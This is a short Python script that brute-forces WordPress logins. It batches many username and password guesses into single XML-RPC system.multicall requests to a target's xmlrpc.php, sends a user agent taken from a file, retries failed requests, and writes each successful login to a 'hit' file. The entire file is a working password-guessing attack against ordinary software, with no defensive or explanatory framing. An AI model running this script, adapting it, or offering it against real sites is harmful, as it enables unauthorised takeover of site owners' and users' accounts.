import sys,urllib.request,xml.etree.ElementTree as ET
host=sys.argv[1]; users=sys.argv[2].split(","); words=[w.strip() for w in open(sys.argv[3]) if w.strip()]
ua=open("ev/ua.txt").read().strip()
def call(u,w):
    return "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>"%(u,w)
def build(p):
    return ("<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"+"".join(call(u,w) for u,w in p)+"</data></array></value></param></params></methodCall>").encode()
pairs=[(u,w) for u in users for w in words]
print("pairs",len(pairs),flush=True)
CH=int(__import__("os").environ.get("CH","25"))
import time
for i in range(0,len(pairs),CH):
    ch=pairs[i:i+CH]
    req=urllib.request.Request("https://%s/%s"%(host,__import__("os").environ.get("XR","xmlrpc.php")),data=build(ch),headers={"User-Agent":ua,"Content-Type":"text/xml"})
    d=None
    for k in range(3):
        try: d=urllib.request.urlopen(req,timeout=45).read().decode("utf-8","replace"); break
        except Exception as e: print("ERR",i,k,type(e).__name__,flush=True); time.sleep(4)
    if d is None: continue
    try: vals=ET.fromstring(d).findall(".//array/data/value")
    except Exception as e: print("PARSE",i,d[:100],flush=True); continue
    print("batch",i,"vals",len(vals),"faults",d.count("faultCode"),flush=True); time.sleep(1)
    for j,v in enumerate(vals):
        if j<len(ch) and not any(n.text=="faultCode" for n in v.findall(".//name")):
            print("HIT",ch[j],flush=True); open("ev/out/hit_set.txt","a").write("HIT %s %s\n"%ch[j])
print("DONE",flush=True)
